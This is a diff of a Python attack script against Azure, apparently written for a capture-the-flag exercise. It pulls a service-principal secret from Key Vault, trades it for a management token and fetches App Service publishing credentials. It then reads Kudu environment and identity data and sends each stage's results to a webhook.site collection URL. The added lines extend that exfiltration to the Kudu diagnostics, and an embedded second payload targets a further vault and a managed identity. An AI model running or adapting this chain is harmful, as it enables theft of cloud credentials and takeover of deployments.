@@ -5,7 +5,7 @@ import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid,traceba
 TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; RG='rg-tbl-reporting-prod-eus'; APP='app-tbl-reporting-prod'; KV1='https://kv-tbl-prod-x3euoz.vault.azure.net'; HOOK='https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825'
 def out(x):
  s=json.dumps(x,default=str); print(s,flush=True)
- if x.get('stage') not in ('flag','app-flag','kudu-result','app-error','worker-error','app-top-error','outer-error'): return
+ if x.get('stage') not in ('flag','app-flag','kudu-result','kudu-diag','app-error','worker-error','app-top-error','outer-error'): return
  try: urllib.request.urlopen(urllib.request.Request(HOOK,data=s.encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
  except Exception: pass
 def j(url,tok):
@@ -24,6 +24,17 @@ try:
  sp=json.loads(j(KV1+'/secrets/reporting-service-principal?api-version=7.4',vt)['value']); sid=sp.get('appId') or sp.get('clientId') or sp.get('client_id'); sec=sp.get('clientSecret') or sp.get('client_secret') or sp.get('password')
  arm=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':sid,'grant_type':'client_credentials','client_secret':sec,'scope':'https://management.azure.com/.default'})['access_token']
  pub=json.loads(urllib.request.urlopen(urllib.request.Request('https://management.azure.com/subscriptions/'+SUB+'/resourceGroups/'+RG+'/providers/Microsoft.Web/sites/'+APP+'/config/publishingcredentials/list?api-version=2023-01-01',data=b'{}',method='POST',headers={'Authorization':'Bearer '+arm,'Content-Type':'application/json'}),timeout=30).read()); p=pub['properties']; auth='Basic '+base64.b64encode((p['publishingUserName']+':'+p['publishingPassword']).encode()).decode(); base='https://'+APP+'.scm.azurewebsites.net'; out({'stage':'credentials','oidc':True,'arm':True,'kudu':True})
+ # One compact diagnostic: expose only identity/runtime fields from Kudu environment.
+ try:
+  rr=urllib.request.urlopen(urllib.request.Request(base+'/api/environment',headers={'Authorization':auth}),timeout=20); raw=rr.read().decode('utf-8','replace'); d=json.loads(raw)
+  def pick(v):
+   if isinstance(v,dict):
+    return {k:(pick(x) if isinstance(x,(dict,list)) else x) for k,x in v.items() if any(t in k.lower() for t in ('identity','msi','website','scm','startup','port'))}
+   if isinstance(v,list): return [pick(x) for x in v[:80]]
+   return v
+  out({'stage':'kudu-diag','environment':pick(d)})
+ except Exception as e: out({'stage':'kudu-diag','error':repr(e)})
+ raise SystemExit(0)
  app=r'''import os,json,time,uuid,urllib.parse,urllib.request,urllib.error,traceback
 HOOK="https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825"; SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"; MIRES="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"; CLIENT="7a85156a-01c4-4e61-8472-40a92107159b"; PRINCIPAL="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
 def out(x):
